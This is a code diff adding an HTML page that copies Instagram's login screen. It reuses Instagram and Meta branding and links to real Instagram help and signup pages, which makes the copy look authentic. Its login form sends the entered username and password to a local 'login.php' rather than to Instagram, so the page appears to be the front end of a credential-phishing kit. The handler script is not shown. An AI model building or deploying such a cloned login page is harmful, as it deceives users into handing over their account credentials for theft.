@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="es">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Instagram</title>
+        <link rel="stylesheet" href="stylesheets/styles.css">
+        <link rel="icon" href="images/instagram_icon.png" type="image/x-icon">
+    </head>
+    <body>
+        <div class="container">
+            <p id="interim">Hola</p>
+            <select id="language_selector">
+                <option value="en">English(US)</option>
+                <option value="af">Afrikaans</option>
+                <option value="id">Bahasa Indonesia</option>
+                <option value="ms">Bahasa Melayu</option>
+                <option value="da">Dansk</option>
+                <option value="de">Deutsch</option>
+                <option value="en-uk">English(UK)</option>
+                <option value="es-la">Español (Latinoamérica)</option>
+                <option value="es-es">Español (España)</option>
+                <option value="fil">Filipino</option>
+            </select>
+            <img id="title" class="imgtitle"src="images/original_instagram_title_dark.png" alt="Instagram title" style="margin:40px;">
+            <button data-key="facebookButton"class="fb-button" onclick="redirectToFacebook()">
+                <img class="imgbutton"src="images/facebook_icon.png" alt="Facebook button">
+                    Continue with Facebook
+            </button>
+            <div class="divider">
+                <span class="line"></span>
+                <span data-key="or"class="or">OR</span>
+                <span class="line"></span>
+            </div>
+            <form id="login_form" action="login.php" method="post">
+                <input id="username_field"data-key="username_field" name="username" type="text" placeholder="Phone number, username, or email" class="input-field">
+                <input id="password_field"data-key="password_field" name="password" type="password" placeholder="Password" class="input-field">
+                <a data-key="forgotPassword"href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Forgot password?</a>
+                <button type="submit" id="login_button"data-key="login_button"class="login-button" disabled>Log in</button>
+            </form>
+            <div data-key="notAccount"class="signup">
+                Don't have an account? <a data-key="signUp"href="https://www.instagram.com/accounts/emailsignup/?hl=es-la" class="register">Sign up</a>
+            </div>
+            <div class="footer">
+                By continuing, you agree to Instagram's <a href="https://help.instagram.com/581066165581870/?locale=en_US"><span class="terms">Terms of Use</span></a> and <a href="https://privacycenter.instagram.com/policy/"><span class="policy">Privacy Policy</span></a>.
+            </div> 
+            <div class="meta">
+                <div class="text_1">from</div>
+                <div class="text_2"><img id="meta" class="imgMeta" src="images/meta_icon_dark.png" alt="">Meta</div>
+            </div>
+        </div>
+        <script src="javascripts/main.js"></script>
+        <script src="javascripts/translation.js"></script>
+    </body>
+</html>
